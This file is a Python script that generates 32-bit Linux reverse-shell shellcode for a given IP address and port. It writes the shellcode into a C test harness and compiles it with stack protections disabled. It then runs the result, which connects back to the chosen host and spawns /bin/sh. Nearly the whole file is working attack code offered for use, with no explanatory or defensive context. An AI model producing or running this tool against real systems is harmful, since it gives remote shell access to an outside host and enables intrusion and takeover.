from sys import argv
import os
from socket import htons

def int2reversehex(string):
    string=str(string)
    string_reverse=r"\x00\x01\x02\x03"
    if "." in string:
        for value,element in enumerate(string.split(".")):
            element=hex(htons(int(element)))
            element=str(element).replace("0x",r"\x").replace(r"00","")
            if len(element)<4:element=element.replace(r"\x",r"\x0")
            string_reverse = string_reverse.replace(r"\x0"+str(value), element)
        return string_reverse
    else:
        port = hex(htons(int(string)))
        port=str(port).replace(r"0x",r"\x")
        while len(port)<6:port=port.replace(r"\x",r"\x0")
        port_part_1=port[2:4]
        port_part_2=port[4:6]
        port=str(r"\x"+str(port_part_2)+r"\x"+str(port_part_1))
        return port
if len(argv) <= 2:
    print ("PLEASE INPUT IP ADDRESS AND PORT NUMBER <python reverse_generate.py IP PORT>")
elif len(argv) > 3:
    print ("PLEASE INPUT ONLY PORT NUMBER")
else:
    ip_address=str(argv[1])
    ip_address_old=ip_address
    ip_address=int2reversehex(ip_address)
    port = int(argv[2])
    port_old=port
    port=int2reversehex(port)
    if r"\x00" in port or r"\x00" in ip_address:
        print ("DON`T USE ZEROS IN PORT OR IP ADDRESS")
        raise SystemExit


    shellcode=r"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x52\x68"+ip_address+r"\x66\x68"+port+r"\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc9\xb1\x03\x31\xd2\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\xfe\xc1\xe2\xf4\x31\xc0\xb0\x0b\x31\xd2\x52\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    print shellcode
    file_text="""
#include<stdio.h>
#include<string.h>

unsigned char code[] =\"""" + shellcode + """";

int main()
{

    printf("Shellcode Length:  %d\\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();

}
"""
    print ("[+] Write data to file")
    file=open("code.c","w")
    file.write(file_text)
    file.close()
    print ("[+] Compile file using GCC")
    os.system("gcc -fno-stack-protector -z execstack -m32 code.c -o code -B /usr/lib32/")
    print ("[+] Reverse shell here, connect to IP: "+str(ip_address_old)+" PORT: "+ str(port_old))
    os.system ("./code")
